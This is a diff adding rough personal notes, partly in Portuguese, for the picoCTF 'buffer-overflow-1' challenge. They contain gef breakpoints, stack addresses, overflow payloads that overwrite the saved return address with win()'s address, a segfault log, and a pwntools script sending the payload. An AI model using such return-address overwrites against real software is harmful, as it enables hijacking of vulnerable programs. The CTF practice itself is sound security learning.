@@ -1,0 +1,67 @@
+
+jump to: 
+	0x080485cd
+
+
+BUFSIZE 32
+
+"A"*32 + '\xcd\x85\x04\x08'
+
+gef➤  b *0x080486a6
+Breakpoint 1 at 0x80486a6
+
+gef➤  b *0x08048641
+Breakpoint 2 at 0x8048641
+gef➤  b *0x08048649
+Breakpoint 3 at 0x8048649
+
+ now check memory addresses
+ x/
+
+
+main: 
+esp: 0xfff4dd70
+ebp: 0xfff4dd98 = bytes no endereço (0xf7620637)
+
+
+enter vuln()
+break and check memory
+we want to override the previous sp 
+
+win():
+eip = 0x80485e6
+pwn eip:
+'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xe6\x85\x04\x08'
+
+'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xe6\x85\x04\x08'
+
+saved eip = 0x80486b3
+prev sp: 0xff855ba0
+
+
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xe6\x85\x04\x08
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xcd\x85\x04\x08
+
+preciso de mais 10 A's - NOP: são só 44 : "A"*44 + p32(0x080485cd)
+'Please enter your string: 
+Okay, time to return... Fingers Crossed... Jumping to 0x80485cd
+bash: line 7: 171417 Segmentation fault      (core dumped) ./vuln
+'
+Estamos é a saltar para o sitio errado
+
+
+from pwn import *
+sh = process("/bin/sh")
+sh.sendline("ssh picoCTF")
+sh.sendline("cd /problems/buffer-overflow-1_1_8a16ff6a1b3cfb2e42c08d9090051a5d")
+
+sh.sendline("./vuln")
+sh.recv()
+
+addr_2_jmp = p32(0x80485e6)
+
+mstr = "A"*44 + addr_2_jmp
+sh.sendline(mstr)
+sh.recv()
